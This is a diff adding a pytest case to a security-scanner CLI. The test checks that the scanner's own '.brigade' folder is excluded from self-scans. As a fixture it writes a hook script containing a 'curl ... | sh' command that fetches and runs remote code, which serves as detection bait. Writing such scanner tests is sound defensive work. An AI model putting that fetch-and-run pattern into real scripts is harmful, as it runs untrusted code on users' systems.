@@ -652,6 +652,66 @@ def test_security_scan_does_not_open_excluded_paths(tmp_path, monkeypatch):
     assert "excluded/secret.txt" not in opened
 
 
+def test_security_scan_cli_excludes_brigade_glob_from_self_scan(tmp_path, capsys):
+    (tmp_path / "hooks" / "install.sh").parent.mkdir(parents=True)
+    (tmp_path / "hooks" / "install.sh").write_text("curl https://example.invalid/install.sh | sh\n")
+    evidence_dir = tmp_path / ".brigade" / "center" / "reports" / "operator-one"
+    evidence_dir.mkdir(parents=True)
+    (evidence_dir / "CENTER_EVIDENCE.json").write_text(
+        json.dumps(
+            {
+                "findings": [
+                    {
+                        "path": "README.md",
+                        "line": 42,
+                        "safe_excerpt": "npx -y @example/unpinned-package",
+                        "category": "supply-chain",
+                        "title": "Unpinned remote package execution",
+                    }
+                ]
+            }
+        )
+        + "\n"
+    )
+    config = tmp_path / ".brigade" / "security.toml"
+    config.write_text(
+        "\n".join(
+            [
+                'policy = "personal"',
+                'scan_profile = "local-only-audit"',
+                'fail_on = "none"',
+                "include_templates = false",
+                'enabled_checks = ["automation", "supply-chain"]',
+                "include_paths = []",
+                'exclude_paths = [".brigade/**"]',
+                'severity_threshold = "low"',
+                'output_path = ".brigade/security/latest"',
+                "",
+                "[suppressions]",
+                "fingerprints = []",
+                "",
+                "[suppression_reasons]",
+                "",
+            ]
+        )
+    )
+
+    assert cli.main(["security", "config", "--target", str(tmp_path), "--json"]) == 0
+    config_payload = json.loads(capsys.readouterr().out)
+    assert config_payload["config"]["exclude_paths"] == [".brigade/**"]
+
+    assert cli.main(["security", "scan", "--target", str(tmp_path), "--json", "--fail-on", "none"]) == 0
+    payload = json.loads(capsys.readouterr().out)
+    finding_paths = {finding["path"] for finding in payload["findings"]}
+    scanned_paths = set(payload["scanned_files"])
+    assert finding_paths == {"hooks/install.sh"}
+    assert not any(path.startswith(".brigade/") for path in finding_paths)
+    assert not any(path.startswith(".brigade/") for path in scanned_paths)
+    assert ".brigade/security.toml" not in scanned_paths
+    assert ".brigade/center/reports/operator-one/CENTER_EVIDENCE.json" not in scanned_paths
+    assert not security_cmd._path_matches_any("nested/.brigade/evidence.json", (".brigade/**",))
+
+
 def test_security_scan_include_paths_do_not_open_unrelated_files(tmp_path, monkeypatch):
     included = tmp_path / "included"
     included.mkdir()
